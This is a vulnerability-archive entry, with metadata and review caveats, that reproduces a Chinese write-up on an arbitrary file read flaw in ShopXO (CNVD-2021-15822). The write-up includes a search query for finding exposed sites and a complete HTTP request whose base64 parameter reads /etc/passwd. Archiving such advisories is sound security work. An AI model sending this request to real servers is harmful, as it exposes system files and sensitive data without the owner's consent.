---
source: "MrWQ/vulnerability-paper"
title: "ShopXO qrcode download文件读取"
product: "ShopXO"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CNVD-2021-15822"
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未知版本；public路径与部署根相关"
prerequisites: "请求匿名示例"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
identifier_role: "primary"
source_url: "https://mp.weixin.qq.com/s/69cDWCDoVXRhehqaHPgYog"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/ShopXO/ShopXO%20download%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2021-15822.md.md"
id: "vw-9cb84b5d99ea9dea3d511300"
entity_id: "ve-9cb84b5d99ea9dea3d511300"
schema_version: "1"
---

# ShopXO qrcode download文件读取

## 条目说明

- 对象与具体问题：ShopXO；qrcode download文件读取
- 版本、配置及部署条件：未知版本；public路径与部署根相关
- 认证与权限前提：请求匿名示例
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 保留145CNVD链接及146本地图片作为互补
- 双.md后缀、过多宣传和Markdown强调损坏；版本仅产品名
- 响应仅截图未视检；缺修复和路径边界限制

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/69cDWCDoVXRhehqaHPgYog)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7f0qibYGLgIyO0zpTSeV1I6m1WibjS1ggK9xf8lYM44SK40O6uRLTOAtiaM0xYOqZicJ2oDdiaWFianIjQ/640?wx_fmt=png)**

**一****：漏洞描述🐑**

**ShopXO 是一套开源的企业级开源电子商务系统。ShopXO 存在任意文件读取漏洞，攻击者可利用该漏洞获取敏感信息**

**二:  漏洞影响🐇**

**ShopXO**

**三:  漏洞复现🐋**

```
app="ShopXO企业级B2C电商系统提供商"
```

**商城主页如下**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7htH9AibquAMvoqJYD5h1KbUuK0JicIxw5icNZKpOKOVJZrpUEun44USqI9VA1j4icV7Amse1aVs7O2Q/640?wx_fmt=png)

**发送漏洞请求包**

```http
GET /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q= HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

**其中 **/url/xxxx** 中的 base64 解码后为 **/etc/passwd****

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7htH9AibquAMvoqJYD5h1Kb1mNQyhQhA2IIo8TmKMGb5ogibEK6RPTbtbXCDgzOr1dKicgLtKYqkaSg/640?wx_fmt=png)

 ****四:  Goby & POC🦉****

```
https://github.com/PeiQi0
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7htH9AibquAMvoqJYD5h1KbNKa3mtwcib8NmjBt8NlaWOoUiaiahrvDTGGsMmntQoy11s1ibibGhjoIDpg/640?wx_fmt=png)

 ****五:  关于文库🦉****

 **在线文库：**

**http://wiki.peiqi.tech**

 **Github：**

**https://github.com/PeiQi0/PeiQi-WIKI-POC**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4cpD8uQPH24EjA7YPtyZEP33zgJyPgfbMpTJGFD7wyuvYbicc1ia7JT4O3r3E99JBicWJIvcL8U385Q/640?wx_fmt=png)

最后
--

> 下面就是文库的公众号啦，更新的文章都会在第一时间推送在交流群和公众号
> 
> 想要加入交流群的师傅公众号点击交流群加我拉你啦~
> 
> 别忘了 Github 下载完给个小星星⭐

**同时知识星球也开放运营啦，希望师傅们支持支持啦🐟**

**知识星球里会持续发布一些漏洞公开信息和技术文章~**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZuHPQeSEAhRof2olkAM9ZghicpNv0p8rRbtNCZJL4t82g15Va8iahlCWeg/640?wx_fmt=png)

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**

**PeiQi 文库 拥有对此文章的修改和解释权如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。**

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
